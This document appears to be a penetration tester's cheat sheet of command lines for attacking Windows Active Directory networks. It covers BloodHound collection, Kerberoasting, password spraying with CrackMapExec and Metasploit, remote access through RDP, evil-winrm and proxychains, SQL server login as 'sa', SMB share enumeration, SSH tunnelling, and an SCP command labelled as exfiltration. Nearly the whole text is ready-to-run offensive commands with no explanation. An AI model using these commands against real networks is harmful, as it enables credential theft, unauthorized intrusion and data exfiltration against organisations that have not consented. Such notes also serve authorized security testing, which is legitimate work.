Bloodhound From Kali
---------------------------------------------------------------
`sudo pip3 install bloodhound`  

`bloodhound-python -u adusername -d domain.corp -v -c dconly -ns x.x.x.x`  
`bloodhound-python -u adusername -d domain.corp -v -c all -ns x.x.x.x`

Kerberoast SPNS
---------------------------------------------------------------
`python3 GetUserSPNS.py -request domain.corp/adusername -dc-ip x.x.x.x`

CrackMapExec
---------------------------------------------------------------
Check for smb access  
`cme smb -u username -p Welcome1 --shares final.txt --continue-on-success`

Password spray against user list  
`cme smb -u usernamesonly.txt -p Welcome1 -d domain.corp  x.x.x.x(target) --continue-on-success`

Grab user list  
`python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all domain.corp/aduser -dc-ip x.x.x.x`

Metasploit Password Spray SMB
---------------------------------------------------------------
`use auxiliary/scanner/smb/smb_login` 

RDP (simple) 
---------------------------------------------------------------
`proxychains-ng xfreerdp /v:x.x.x.x /u:username /d:domain.corp /p:Welcome1`

RDP (Clipboard, mounted tsclient) 
---------------------------------------------------------------
`proxychains-ng xfreerdp +clipboard /v:x.x.x.x /u:username /d:domain.local /drive:tsclient,/path/to/mounted/folder/` 

Evil-winrm
---------------------------------------------------------------
`proxychains-ng evil-winrm -i x.x.x.x -u username -p 'Welcome1'`

SCP Exfil
---------------------------------------------------------------
`scp SuperSecretDummyExfil.xlsx username@x.x.x.x:/home/pentesting`

Database CommandLine Access SQSH
---------------------------------------------------------------
`proxychains-ng sqsh -S x.x.x.x -U sa -P Welcome1`

Access SMB Share
---------------------------------------------------------------
Check for null session  
`echo exit | smbclient -L \\\\$line`

Connect and explore through smbclient  
`smbclient //x.x.x.x/share`  

Mount open share locally  
`sudo mount //x.x.x.x/share /mnt/share`

Proxychains ssh
---------------------------------------------------------------
`ssh -L 7777:localhost:7777 username@hostname.com`  
`ssh -ND 7777 username@localhost`

Invoke Share Finder
---------------------------------------------------------------
`Invoke-ShareFinder -CheckShareAccess -ExcludeStandard -ExcludePrint -ExcludeIPC -Verbose | Out-File -Encoding ASCII`  
